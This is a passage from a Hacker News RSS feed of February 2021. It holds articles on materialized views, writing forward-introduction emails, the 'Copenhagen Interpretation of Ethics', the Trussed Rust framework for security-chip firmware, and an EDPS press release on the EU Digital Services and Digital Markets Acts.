<p>The primary interface for creating these views is plain and elegant: A <a href="https://materialize.com/docs/sql/create-materialized-view/"><code>CREATE MATERIALIZED VIEW</code></a> SQL statement.</p>

<p>Conceptually, this is roughly the same statement that is available in 
<a href="https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/CREATE-MATERIALIZED-VIEW.html">tradition…</a></p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nchammas.com/writing/data-pipeline-materialized-view">https://nchammas.com/writing/data-pipeline-materialized-view</a></em></p>]]>
            </description>
            <link>https://nchammas.com/writing/data-pipeline-materialized-view</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217911</guid>
            <pubDate>Sun, 21 Feb 2021 22:26:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introductions and the “forward intro email” (2016)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26217675">thread link</a>) | @tosh
<br/>
February 21, 2021 | https://also.roybahat.com/introductions-and-the-forward-intro-email-14e2827716a1 | <a href="https://web.archive.org/web/*/https://also.roybahat.com/introductions-and-the-forward-intro-email-14e2827716a1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><div><div><div><div><a href="https://roybahat.medium.com/?source=post_page-----14e2827716a1--------------------------------" rel="noopener"><div><p><img alt="Roy Bahat" src="https://miro.medium.com/fit/c/96/96/0*0vO9AXL5kMd7Atxo.jpg" width="48" height="48"></p></div></a></div></div></div></div></div><p id="b00b">Making introductions is one of the most rewarding things we do as backers and builders of startups — it’s the fastest way to share one of our most important sources of power, our relationships, with promising startups and friends.</p><p id="5fd7">If you ask me for an introduction, I’ll introduce you to literally anyone I know if I believe it’s likely to be in their interest. (And I’m a fan of the opt-in intro*, where I ask the receiver if they’re willing before I introduce you.)</p><p id="3fbe">I’ll sometimes say:</p><blockquote><p id="85a6"><em>“Please write me an email I can forward to them.”</em></p></blockquote><p id="c57f">You’d be shocked how often I get back something unusable (or, put differently, something unlikely to achieve your goal of connecting with the receiver of the intro).</p><p id="49f2">To save us both time, here’s what I mean when I ask for a forward intro email.</p><p id="f4a0"><strong>First, why do I ask for this, specifically?</strong> (Compared to, say, “please send me a blurb about your company,” or “draft me an email I can send” or some other way to get things going?) This method lets you do the things you’re best at — describing who you are, what your organization does, why you want to talk to the receiver, speaking in your own voice, etc. And I do only the things I’m best at — knowing the receiver, and sharing my opinion of you. It also allows me to spend as little time as possible, so I can make your introduction as quickly as possible.</p><p id="e527">When you send me this kind of forward intro email, I’ll literally hit “forward” and write something like “Hey Karin, I just met this founder and thought she was onto something — take a look at the below, do you want to talk?”</p><p id="7ccd">When the receiver replies, usually with a “sounds great,” I’ll just add you to the chain and it’s done (vs. having to write yet another email introducing you both).</p><p id="6200"><strong>A good forward intro email…</strong></p><ol><li id="0b73"><em>Says why you want to be introduced</em></li><li id="e477"><em>Includes its own context</em> — enough about you or your startup so the receiver understands what’s being asked. If it’s missing context (like what your startup does), then I’m spending time adding that (and possibly mangling it). It always helps to include what’s special about your startup, because it makes the receiver more likelly to want to meet you. Attach a file if you think it makes sense (a deck, or a longer summary, or a screenshot, whatever).</li><li id="07a0"><em>Uses only as many words as you need</em> — the receiver is going to glance at the email, and decide whether to talk to you. A recap of other things we talked about when we met distracts.</li><li id="98fb"><em>Sounds like you</em> — I really have zero preference about whether you’re formal or loose, so emoji away.**</li><li id="0447"><em>Starts a fresh chain, with a fitting subject line, for each introduction</em> — if you write a forward intro email as a reply to a long string between us (including, for example, us talking about whether it makes sense for you to speak to the receiver) that delays your intro. I’m editing all that out, re-titling the email, etc. Subject lines like “Forward intro email for Karin” also cost me time to fix.</li></ol><p id="3c75">Here’s an example for one I just got that works well (I only have one suggestion, see after you read the email)…</p><blockquote><p id="f9ba"><em>— — — — Forwarded message — — — -</em></p><p id="a88e"><em>From: </em><a href="https://medium.com/u/7f05f6709c9f?source=post_page-----14e2827716a1--------------------------------" target="_blank" rel="noopener"><em>Alyssa Ravasio</em></a></p><p id="6d24"><em>Date: Thu, Jul 10, 2014 at 9:35 AM</em></p><p id="4de2"><em>Subject: Intro to Hunter Walk</em></p><p id="13ae"><em>To: Roy Bahat</em></p><p id="3b66"><em>Hi Roy,</em></p><p id="8ef6"><em>I think </em><a href="https://medium.com/u/209207e81261?source=post_page-----14e2827716a1--------------------------------" target="_blank" rel="noopener"><em>Hunter Walk</em></a><em> / Homebrew would be an amazing investor for Hipcamp. I love their emphasis on the bottom up economy. This resonates deeply with our mission and personal goals as well, since parks are engines of local economies.</em></p><p id="b2f0"><em>Here’s a bit more about our company:</em></p><p id="020a"><a href="http://t.umblr.com/redirect?z=http%3A%2F%2Fwww.hipcamp.com%2F&amp;t=NDlmM2Y1NTBlNGJkMTQ4YTAwNTJjYmI5OGEwMzIxMzhhMTAxNjNkMyx3N2VGMU9WdQ%3D%3D&amp;b=t%3AZCRQNoz836scNcwEH-pNmw&amp;m=1" rel="noopener"><em>Hipcamp</em></a><em> helps people discover and book campsites and cabins, a $3B market that has remained stagnant and fragmented since the 90’s. They are bringing the world’s public campgrounds online, unlocking access to private lands for camping, and ultimately, getting more people outside.</em></p><p id="4ae3"><a href="https://medium.com/u/652de9fe92e3?source=post_page-----14e2827716a1--------------------------------" target="_blank" rel="noopener">Dave Morin</a><em>’s Slow Ventures is leading our </em><a href="http://t.umblr.com/redirect?z=https%3A%2F%2Fangel.co%2Fhipcamp%2Ffundraising&amp;t=OWY4ZGFkM2E1NGZhN2JjNzQwZGEwZGU0Zjc3ZmQ3OTIwNGYxN2Q4MSx3N2VGMU9WdQ%3D%3D&amp;b=t%3AZCRQNoz836scNcwEH-pNmw&amp;m=1" rel="noopener"><em>seed round</em></a><em>, we’re oversubscribed but can make room by reducing the allocation on Angel List. I’d love to connect with Hunter soon to explore if this is a good fit.</em></p><p id="330c"><em>Thanks Roy!!</em></p><p id="1797"><em>Alyssa</em></p></blockquote><p id="3ee1">(What’s the one fix? The subject line. When that lands in Hunter’s inbox, it turns into something meaningless to him. “Hipcamp intro to Hunter” might be better. Otherwise, it’s letter perfect and, Alyssa, good luck with your raise.)</p><p id="d9b9">Please avoid confusing a forward intro email with similar-sounding things I believe are worse:</p><ul><li id="dcb2">“Please draft an email I can send.” This is inevitably time-consuming and difficult for you to do well, because you have to guess at my voice, and at the nature of my relationship with the receiver. I’ll inevitably have to spend time editing it, delaying your intro.</li><li id="dd53">“Please send me a blurb I can use.” This is a mini-version of the same issue, if it’s being sent in my voice I inevitably tweak it. And, if your blurb is complete enough, it might as well just be a forward intro email.</li><li id="25ab">Reminder emails. I do sometimes ask for this, a quick one-liner to remind me I promised to make an introduction. I ask for this when I know you and the other person so well that I need no additional ammo and it’s just as fast for me to write the full thing myself.</li><li id="2b8c">Lists of introductions I need to make. Sometimes, I’ll talk to someone and agree to introduce them to more than one receiver. If I get an email from you that says “Hey great talking, thanks for being willing to introduce me to X, Y, Z”… that creates a lot of work for me. Same with “Can you introduce me to some customers?” New chain for each introduction, edit out each person’s name from the other ones (especially if I am introducing you to two people who are competitors!), etc.</li></ul><p id="78e2">One extra advantage of this method, which <a href="https://medium.com/u/78b149645d9?source=post_page-----14e2827716a1--------------------------------" target="_blank" rel="noopener">Alex Lassar</a> pointed out to me, is that the email you send me asking for the intro could just be a forward intro email — see, you saved a step.</p><p id="c7ed">And now, when I ask for a forward intro email, you know what I mean. Too much hoopla for a simple intro? I want us all to shave complexity off the process of knowing each other. And when you make introductions 5–10 times a day, you could be making thousands of intros per year. It adds up, and it’s important to get right. People are the currency of the realm.</p><figure><div></div></figure><p id="6649"><em>[I got a request to move this oldie-but-goodie from my personal blog to Medium and, separately, </em><a href="https://medium.com/u/86a8b1c606a8?source=post_page-----14e2827716a1--------------------------------" target="_blank" rel="noopener"><em>James</em></a><em> asked me to share more detail about the different cases of introductions, which I did </em><a href="https://www.quora.com/What-is-the-protocol-for-doing-an-introduction-over-email/answer/Roy-Bahat" rel="noopener"><em>on Quora</em></a><em>.]</em></p></div></div></section></div>]]>
            </description>
            <link>https://also.roybahat.com/introductions-and-the-forward-intro-email-14e2827716a1</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217675</guid>
            <pubDate>Sun, 21 Feb 2021 22:00:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Almost No One Is Evil. Almost Everything Is Broken (2015)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26217636">thread link</a>) | @havan_agrawal
<br/>
February 21, 2021 | https://blog.jaibot.com/the-copenhagen-interpretation-of-ethics/ | <a href="https://web.archive.org/web/*/https://blog.jaibot.com/the-copenhagen-interpretation-of-ethics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-438">

		
		

		<!-- .entry-header -->

		

		<div>

			<p>The Copenhagen Interpretation of quantum mechanics says that&nbsp;you can have a particle spinning clockwise and counterclockwise at the same time – until you look at it, at which point it definitely becomes one or the other. The theory claims that&nbsp;observing reality fundamentally changes it.</p>
<p>The Copenhagen Interpretation of Ethics says that when you observe or interact with a problem in any way, you can be blamed for it. At the very least, you are to blame for not doing <em>more</em>. Even if you don’t make the problem worse, even if you make it slightly better, the ethical burden of the problem falls on you as soon as you observe it. In particular, if you interact with a problem and benefit from it, you are a complete monster. I don’t subscribe to this school of thought, but it seems pretty popular.</p>
<hr>
<p>In 2010, <a href="http://www.nytimes.com/2010/12/09/nyregion/09placebo.html?_r=2&amp;hpAlways=&amp;pagewanted=all">New York randomly chose homeless applicants to participate in its Homebase program</a>, and tracked those who were not allowed into the program as a control group. The program was helping as many people as it could, the only change was explicitly labeling a number of people it wasn’t helping as a “control group”. The response?</p>
<blockquote><p>“They should immediately stop this experiment,” said the Manhattan borough president, <a title="More articles about Scott M. Stringer." href="http://topics.nytimes.com/top/reference/timestopics/people/s/scott_m_stringer/index.html?inline=nyt-per">Scott M. Stringer</a>. “The city shouldn’t be making guinea pigs out of its most vulnerable.”</p></blockquote>
<hr>
<p>On March 11th, 2012, the vast majority of people did nothing to help homeless people. They were busy doing other things, many of them good and important things, but&nbsp;by and large not improving the well-being of homeless humans in any way. In particular, almost no one was doing anything for the homeless of Austin, Texas. BBH Labs was an exception – they outfitted 13 homeless volunteers with WiFi hotspots and asked them to offer WiFi to SXSW attendees&nbsp;in exchange for donations. In return, they would be paid $20 a day plus whatever attendees gave in donations. Each of these 13 volunteers chose this over all the other things they could have done that day, and benefited from it – not a vast improvement, but significantly more than the 0 improvement that they were getting from most people.</p>
<p>The <a href="http://www.wired.com/2012/03/the-damning-backstory-behind-homeless-hotspots-at-sxswi/">response</a>?</p>
<blockquote><p><span tabindex="-1">IT SOUNDS LIKE </span>something out of a <a href="http://nytsxsw.tumblr.com/post/19145988299/getting-a-decent-data-connection-at-sxsw-can-be-a">darkly satirical science-fiction dystopia</a>. But it’s absolutely real — and a completely problematic treatment of a problem that otherwise probably wouldn’t be mentioned in any of the panels at South by Southwest Interactive.</p></blockquote>
<p>There wouldn’t be any scathing editorials if BBH Labs had just chosen to do nothing – but they&nbsp;did something helpful-but-not-maximally-helpful, and thus are open to judgment.</p>
<hr>
<p>There are times when it’s almost impossible to get a taxi – when there’s inclement weather, when a large event is getting out, or when it’s just a very busy day. Uber attempts to solve this problem by introducing surge pricing – charging more when demand outstrips supply. More money means more drivers willing to make the trip, means more rides available. Now instead of having no taxis at all, people can choose between an expensive taxi or no taxi at all – a marginal improvement.&nbsp;Needless to say, Uber has been repeatedly lambasted for doing something instead of leaving the even-worse status quo the way it was.</p>
<hr>
<p>Gender inequality is a persistent, if hard to quantify, problem. <a href="http://blog.jaibot.com/?p=392">Last year I blogged</a> about how amoral agents could save money and drive the wage gap down to 0 by offering slightly less-sexist wages – while including some caveats about how it was probably unrealistic and we wouldn’t see anything like that in reality.&nbsp;So of course <em><strong>less than a week after I wrote that&nbsp;</strong></em><a href="http://www.theage.com.au/it-pro/business-it/evan-thornley-causes-stir-with-sexist-comments-at-sunrise-startup-conference-20140922-10kiku.html" target="_blank">Evan Thornley says</a>&nbsp;:</p>
<blockquote><p>“There’s a great arbitrage there, we would give [women] more responsibility and a greater share of the rewards than they were likely to get anywhere else and that was still often relatively cheap to someone less good of a different gender.”</p>
<p>While Mr Thornley said he wasn’t advocating that the gender pay gap should be perpetuated, he said it provided “an opportunity for forward thinking people”.</p>
<p>A number of online commentators, as well as Australian start-up blogs, have since said Mr Thornley’s comments were sexist.</p></blockquote>
<p>Mr. Thornley improved on the status quo – but in the process he interacted the problem and was thus caught up in it. This is a strategy which, if widely embraced, would practically eliminate&nbsp;many forms of wage discrimination overnight simply by harnessing something we have way too much of already: greed. So of course it was denounced.</p>
<hr>
<p>Last year the city of Detroit began to crack down on unpaid water bills, and thousands of poor people suddenly faced the prospect of having their water shut off. The vast majority of people did nothing to help them whatsoever. PETA did offer conditional help: If a family went vegan for 30 days, PETA would pay off their water bill, and throw in a basket of vegan food to boot. This was strictly more helpful than what 99.99999% of humanity was doing for Detroit residents at the time, as it didn’t make anything worse and offered a trade for anyone who valued 30 days of not-being-vegan less than however much they owed on their water bill. For marginally improving he situation instead of ignoring it, they were <a href="http://thinkprogress.org/economy/2014/07/24/3464033/peta-is-the-worst/" target="_blank">denounced as “the worst”</a>.</p>
<hr>
<p>Peter Singer has a famous thought experiment about a child&nbsp;drowning in a pond. I’ll let <a href="http://www.philosophybro.com/post/120721529553/peter-singers-drowning-child-argument" target="_blank">Philosophy Bro</a> explain:</p>
<blockquote><p>Like, let’s say I’m on my way to a bitchin’ party and I’m looking fly as shit and I smell good because <i>you already know</i>, and I’ve got a 30-rack of Natty because I’ll be goddamned if I show up empty-handed to the house I’m about to burn down. Once I get over this bridge, and turn the corner I’ve arrived and so has the party. Except I hear a bunch of splashing and I look over the bridge into the river and – fuck me – there’s a kid flailing around and calling for help, like he’s drowning for some reason instead of handling his shit like an adult.</p>
<p>I should save his life, right?</p>
<p>Sometimes in philosophy we like to ask obvious questions and waggle our eyebrows suggestively, like maybe you don’t exist after all, <i>hmm</i>? but bro, this is not one of those times. I should obviously jump in and SAVE THIS FUCKING CHILD’S LIFE. So I ruin a Polo and I don’t smell good anymore and a couple of the beers explode because I dropped them. Who gives a shit, right? A child was going to die.</p>
<p>…[snip]…</p>
<p>What if I told you that for $5, you could buy a life-saving vaccine for a child? Sure, he’s far away, but we already agreed: who gives a shit, right? It’ll still save his life, and it only costs you not having a fifth drink at the bar on a Thursday. Remember that $300 bar receipt you posted with the caption “just another Thursday night wearing matching plaid with my bros, we’re special and impressive and are the ACTUAL six dudes with the biggest dicks, unlike all you OTHER overconfidences of bros who think that, well guess what, it’s us?” What you were really saying was “I routinely pass up the chance to save two dozen lives with science so that I can black out and pretend that I like myself for a night.” That’s fucked up, bro.</p></blockquote>
<p>The difference is that the drowning child has been definitively noticed, and thus her moral weight bears down on us and we have to save her. But children thousands of miles away? Not noticed!</p>
<p>I think this might be where a lot of the discomfort with talking about things we can do to alleviate suffering comes from. If you implicitly believe in the Copenhagen Interpretation of Ethics, then to confront the scope of suffering in the world is to make it your fault, and then if you don’t throw everything you have at the problem you’re as “bad” as PETA or Mr. Thornley or Uber or BBH Labs.</p>
<p>But what if – what if noticing a problem didn’t make it any worse? What if we could act on&nbsp;a problem and not feel horrible for making it just a little better, even if it was an action that benefited ourselves as well? What if we said that in these instances, these groups weren’t evil – it’s okay to notice a problem and only make it a little bit better. If everyone did that, the world would be a vastly better place. If everyone “exploited” opportunities where they could benefit and alleviate people’s suffering at the same time, we’d all be better off.</p>


		</div>

		

		
		

		<!-- .entry-footer -->

		

		
	</article></div>]]>
            </description>
            <link>https://blog.jaibot.com/the-copenhagen-interpretation-of-ethics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217636</guid>
            <pubDate>Sun, 21 Feb 2021 21:55:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trussed – a new Rust framework for security chips that could replace JavaCard]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26217528">thread link</a>) | @conorpp
<br/>
February 21, 2021 | https://trussed.dev/blog/trussed-announcement/ | <a href="https://web.archive.org/web/*/https://trussed.dev/blog/trussed-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>Today’s the day: We’re very proud to announce <a href="https://trussed.dev/">Trussed</a>®, an open source framework for modern cryptographic applications, which powers the FIDO and PIV authenticators of the Bee firmware on the new Solo V2 security key by SoloKeys.</p><p>It’s written in Rust.</p><p><img src="https://trussed.dev/images/uploads/trussed-square-200.png" alt=""></p><h3 id="summary">Summary</h3><p>This announcement will give a high-level overview of the motivation for and design of Trussed. It will be followed soon by a “tutorial” of sorts, walking through an <a href="https://github.com/trussed-dev/trussed-totp-pc-tutorial">implementation of TOTP</a> (time-based one-time password, a commonly used second factor authentication method) in minimal form on PC.</p><p>We’re not just announcing, we’re also releasing the source code, dual-licensed under the Apache and MIT licenses, on GitHub: <a href="https://github.com/trussed-dev/trussed/">https://github.com/trussed-dev/trussed/</a>. This code is still very much a work in progress, and does not yet come with stable functionality or API promises. However, we think the time has come to continue further work in public, so we may learn from the open source community.</p><p>“We” here are not just SoloKeys, but also <a href="https://www.nitrokey.com/" title="Nitrokey">Nitrokey</a>, our competitor-slash-collaborator from Germany that has always used SoloKeys firmware in their web authentication products, and will continue to do so. <a href="https://www.nitrokey.com/" title="Nitrokey">Nitrokey</a> will have their own announcement on this topic and their further plans for security keys here.</p><p>Together, we loosely build the current “Trussed Alliance” of Trussed implementers, users, and evangelists. We are reachable by several means, for instance via email at <a href="mailto:alliance@trussed.dev">alliance@trussed.dev</a>, by Matrix chat in <a href="https://matrix.to/#/#trussed:matrix.org">#trussed:matrix.org</a>, or async at <a href="https://github.com/trussed-dev/trussed/discussions">github.com/trussed-dev/trussed/discussions</a>. We are very interested in and open to additional allies. Particularly, at this stage, those with strong (correct) opinions, and the drive to contribute to the implementation :)</p><h3 id="but-what-is-trussed">But what is Trussed?</h3><p>You may be aware of PKCS #11 (<a href="http://docs.oasis-open.org/pkcs11/pkcs11-ug/v2.40/pkcs11-ug-v2.40.html">usage guide</a>), which – despite all of its warts – is a standardized, high-level, platform-independent API, enabling software to make use of hardware-backed cryptography. There are other APIs in a similar spirit, such as <a href="https://www.w3.org/TR/WebCryptoAPI/">WebCrypto</a> by the W3C (with its own warts, and notably relaying JavaScript applications to software implementations of cryptography), or <a href="https://github.com/parallaxsecond/parsec">PARSEC</a> (backed by Arm and Docker, which has a rather more grand scope).</p><p>All of these have in common that applications can outsource their cryptographic needs to a trusted third party implementation through a common API. Secret keys can be generated for various algorithms or mechanisms (symmetric cryptography such as AES, asymmetric cryptography such as P256, Ed25519, X25519, RSA, etc.). The application obtains not the sensitive key material, but instead a handle object, with which it can then perform further operations: sign data, verify signatures, encrypt or decrypt data, etc.</p><p>The core idea of Trussed is this: What if there were similar facilities – without the warts – right inside the firmware of embedded devices?</p><p>Thinking further: What if these were provided by idiomatic, misuse-resistant, best cryptographic practice-following APIs? What if the list of available cryptographic mechanisms, together with their software or hardware implementations, were flexibly configurable at compile time, but came with “batteries included”? What if this “crypto-in-a-box” would be easy to plug into whatever setup one is already using? What if applications, then, could focus on implementing their domain-specific logic and interfaces with the outside world, while taking advantage of <a href="https://www.imperialviolet.org/2016/05/16/agility.html">one cryptographic joint, kept well oiled.</a></p><p>And that is exactly what Trussed is!</p><h3 id="portable-trussed-apps">Portable Trussed apps</h3><p>You may see the term “Trussed app”. By this we mean any unit of firmware that uses the Trussed APIs, and otherwise is completely cross-platform (meanwhile, it will be called externally by the runtime/scheduler). To repeat, a Trussed app is called externally, but internally only calls Trussed APIs – this makes it portable to all platforms on which Trussed itself runs on.</p><p>Two prime examples would be the FIDO and PIV authenticator apps by SoloKeys. In the past (with the existing Solo V1 key C firmware), when others wanted to “somehow reuse” app code it didn’t really work – forks happened, or even simple copy-pastes. Similarly, Google’s FIDO2 implementation in <a href="https://github.com/google/OpenSK">OpenSK</a> is tightly coupled to the Tock OS around it, and limited to devices which have Tock OS support.</p><p>By decoupling from runtimes, and making minimal requirements on Trussed platforms, we envision that “Trussed apps” will be shareable between vendors (each adding their own runtime and physical product). That bug fixes and functionality additions can be shared. That alternative implementations of existing applications are possible (e.g., a <a href="https://github.com/dicekeys/seeding-webauthn">DiceKeys</a>-backed FIDO2 app).</p><p>Generally, we would like to open up an ecosystem of “Trussed apps” (WireGuard, password managers, GPG for those that like it, pocket HSMs, etc.), eventually replacing JavaCard and bringing embedded cryptographic firmware to the modern age.</p><h3 id="trussed-components">Trussed Components</h3><p>There are two major components in Trussed, the service, and the clients.</p><p>The service depends on platform resources (storage, entropy, UI facilities), bundles up cryptographic algorithm implementations at compile time, and is then just a beefy component with a “process” method. This method needs to be called by the runtime/scheduler, either regularly, or on-demand via a provided syscall abstraction.</p><p>The service’s storage is partitioned by client, and further by type of object the service is responsible for managing on a client’s behalf: A key store for cryptographic keys, a file store for binary metadata (exposed as a POSIX-ish filesystem interface), and a certificate store.</p><p>The clients correspondingly have APIs (for crypto, file and other needs) to send requests with, for instance a “CryptoClient + P256 + HmacSha256”. Client and service communicate via <a href="https://docs.rs/interchange">interchanges</a>, shared memory areas in which requests and replies are placed. Both the requests and replies are modeled as Rust types, so there is no low-level memory copying and length calculations. Additionally, interchanges serve as a strong demarcation between different privileged executions (such as the secure and nonsecure worlds in ARM TrustZone).</p><h3 id="what-is-trussed-not">What is Trussed not?</h3><p>Trussed intends to be a configurable box you can use with ease in your firmware, but it does not intend to take over your entire platform. It is not an embedded operating system. Trussed does not use the heap, all variables are allocated on the stack. Trussed does not internally use threads in any way, control flow is linear and predictable.</p><p>To create a functional product, besides a Trussed platform, you need to supply:</p><ul><li>runtime/scheduler: with SoloKeys, we use <a href="https://rtic.rs/">RTIC</a> (Real-Time Interrupt-driven Concurrency), which is a thin software wrapper around the Arm Cortex-M NVIC hardware scheduler. Conceivably, something like <a href="https://www.tockos.org/">Tock</a> should work, or threaded scheduling on PC</li><li>interfaces: with SoloKeys, we use <a href="https://docs.rs/usb-device">usb-device</a> as a framework to implement USB classes (CTAPHID, CCID) on top of our <a href="https://github.com/lpc55/lpc55-hal">LPC55 HAL</a> (hardware abstraction layer), and our own NFC device framework</li><li>dispatch: depending on the richness of the runtime, there may be separate need to dispatch between multiple interfaces and multiple applications</li><li>secure manufacturing: Trussed has the concept of “device attestation”, binding a unique identifier for the chip it runs on to private device attestation keys (Ed255 + P256), via a vendor certificate authority. Further it has a concept of “key attestation”, attesting keys on the device as being generated on the device and not being extractable, via the device attestation keys and certificates. While Trussed exposes methods to do this, they rely on preparations that depend on the platform and need to be done in the manufacturing process.</li><li>optionally, a secure signed firmware update procedure: conceivably, Trussed might be used in a custom bootloader, but the compile-time security of Trussed comes from firmware “bundles” being verified by a vendor. There needs to be a way to ensure any changes to the firmware are “atomic” and authorized, replacing the entire bundle of runner + apps + Trussed with a new non-compromised setup (operating on the existing data).</li></ul><h3 id="first-implementation">First Implementation</h3><p>SoloKeys <a href="https://solokeys.com/blogs/news/our-solo-v2-campaign-launches-on-january-26th">will be releasing the first products built with Trussed</a>. Their Solo v2 authenticators are fully open source and designed for enterprise use for FIDO2 and PIV. More applications are to follow, all based on Trussed.</p><p><img src="https://trussed.dev/images/uploads/solov2.png" alt="Solo V2" title="Solo V2"></p><h3 id="what-about-the-trademark">What about the trademark?</h3><p>To conclude, we would like to explain why Trussed sometimes has a registered trademark symbol next to it. First off, as mentioned, the source code itself is permissively dual-licensed. There is no intent for any “open core” kind of license/monetization scheme (some reasoning that resonates is <a href="https://250bpm.com/blog:15/">here</a>). We consider the ideas expressed in Trussed to be public domain, and really just an (ongoing) distillation of best practices.</p><p>However, when a vendor wishes to sell a product, and advertise that it is “Built on Trussed”, has “Trussed® Inside”, or similar (in effect, profit from the trust we will build in Trussed!), we would like to be able to ensure that basic requirements are fulfilled for the platform, applications and product manufacturing chain – this is needed to make a secure product.</p><p>As an example, Trussed ensures keys are kept secret by storing them encrypted-at-rest at all times. It can do so either by using a backing storage that is encrypted by hardware, or adding a software encryption layer itself – one or the other, but it needs to be ensured.</p><p>As another example, Trussed needs a source of entropy. Ideally, a platform has a hardware source, alternatively, the manufacturing process can inject an entropic seed – again, one or the other (or both) need to be ensured.</p><p>To sum up, we hope that you find use for Trussed in your products. The more eyes, the better! If you do use Trussed, we’d like you to advertise that you do. In this case, please contact <a href="mailto:alliance@trussed.dev">alliance@trussed.dev</a> so we can discuss. There is no formal certification process at this point.</p><h3 id="some-more-details-about-portability">Some more details about portability</h3><p>Cryptographic implementations …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://trussed.dev/blog/trussed-announcement/">https://trussed.dev/blog/trussed-announcement/</a></em></p>]]>
            </description>
            <link>https://trussed.dev/blog/trussed-announcement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217528</guid>
            <pubDate>Sun, 21 Feb 2021 21:42:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EDPS Opinions on the Digital Services Act and the Digital Markets Act]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26217433">thread link</a>) | @karlzt
<br/>
February 21, 2021 | https://edps.europa.eu/press-publications/press-news/press-releases/2021/edps-opinions-digital-services-act-and-digital_en | <a href="https://web.archive.org/web/*/https://edps.europa.eu/press-publications/press-news/press-releases/2021/edps-opinions-digital-services-act-and-digital_en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-off-canvas-main-canvas="">
    <div id="page-wrapper">
  <div id="page">
    
      


            <div id="main-wrapper">
              <div id="main">
          <div>
              <main id="content" role="main">
                <section>
                  <a id="main-content" tabindex="-1"></a>
                    
<div id="block-edpsweb-theme-main-page-content">
        <div>
      

<article role="article">
  
  <div>
    <header>
      
      
      <h3>
        <a href="https://edps.europa.eu/press-publications/press-news/press-releases/2021/edps-opinions-digital-services-act-and-digital" rel="bookmark"><span>EDPS Opinions on the Digital Services Act and the Digital Markets Act </span>
</a>
      </h3>
      
    </header>
    <div>
      
            <div><p>The EDPS published Opinions today on the European Commission’s proposals for a <a href="https://edps.europa.eu/sites/edp/files/publication/21-02-10-opinion_on_digital_services_act_en.pdf">Digital Services Act</a> and a <a href="https://edps.europa.eu/sites/edp/files/publication/21-02-10-opinion_on_digital_markets_act_en.pdf">Digital Markets Act</a>. Both Opinions aim to assist the EU legislators to shape a digital future rooted in EU values, including the protection of individuals’ fundamental rights, such as the right to data protection.</p>
<p>The EDPS welcomes the proposal for a <strong>Digital Services Act</strong> that seeks to promote a transparent and safe online environment. In his Opinion, the EDPS recommends additional measures to better protect individuals when it comes to content moderation, online targeted advertising and recommender systems used by online platforms, such as social media and marketplaces.</p>
<p><strong>Wojciech Wiewiórowski, EDPS, said: </strong><em>“We note that the Proposal does not impose a general monitoring obligation, it confirms reasonable liability exemptions and supplements them with a pan-European system of notice and action rules, so far missing.”</em></p>
<p>The EDPS highlights that any form of content moderation should take place in accordance with the<strong> </strong>rule of law. Profiling for the purpose of content moderation should be prohibited unless the online service provider can demonstrate that such measures are strictly necessary to address the systemic risks explicitly identified in the Digital Services Act. Furthermore, the European legislators should consider a ban on online targeted advertising based on pervasive tracking and restrict the categories of data that can be processed for such advertising methods.</p>
<p>In his Opinion on the <strong>Digital Markets Act</strong>, the EDPS welcomes the European Commission’s proposal that seeks to promote fair and open digital markets and the fair processing of personal data by regulating large online platforms acting as gatekeepers.</p>
<p><strong>Wojciech Wiewiórowski, EDPS, said: </strong>“<em>Competition, consumer protection and data protection law are three inextricably linked policy areas in the context of the online platform economy. Therefore, the relationship between these three areas should be one of complementarity, not friction.”</em></p>
<p>The EDPS highlights the importance of fostering competitive digital markets so that individuals have a bigger choice of online platforms and services that they can use. Giving users better control over their personal data can reinforce contestability in digital markets. Increased interoperability can help to address user lock-in and ultimately create opportunities for services to offer better data protection.</p>
<p>To guarantee the successful implementation of the European Commission’s Digital Services Act package, the EDPS calls for a clear legal basis and structure for closer cooperation between the relevant oversight authorities, including data protection authorities, consumer protection authorities and competition authorities.</p>
</div>
      
            <div><p>The rules for data protection in the EU institutions, as well as the duties of the European Data Protection Supervisor (EDPS), are set out in <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN"><strong>Regulation (EU) 2018/1725</strong></a>.&nbsp;</p>
<p><strong>Processing of personal data:</strong> According to Article 3(3) of Regulation (EU) 2018/1725, processing of personal data refers to “any operation or set of operations which is performed on personal data or on sets of personal data, whether or not by automated means, such as collection, recording, organisation, structuring, storage, adaptation or alteration, retrieval, consultation, use, disclosure by transmission, dissemination or otherwise making available, alignment or combination, restriction, erasure or destruction". See the <a href="https://secure.edps.europa.eu/EDPSWEB/edps/EDPS/Dataprotection/Glossary/pid/84">glossary</a> on the EDPS website.</p>
<p>The legislative consultation powers of the EDPS are laid down in Article 42 of Regulation (EU) 2018/1725 which obliges the European Commission to consult the EDPS on all legislative proposals and international agreements that might have an impact on the processing of personal data. Such an obligation also applies to draft implementing and delegated acts. The statutory deadline for issuing an EDPS opinion is 8 weeks.</p>
<p>The EDPS opinions are published on our website, and later on in the Official Journal of the EU, and officially transmitted to the European Parliament, the Council and the Commission.</p>
<p>The EDPS also has the power to issue opinions on any issue of relevance to the protection of personal data, addressed to the EU legislator or to the general public, in response to a consultation by another institution or on his own initiative.</p>
</div>
      


  



    </div>
  </div>
</article>

    </div>
  </div>

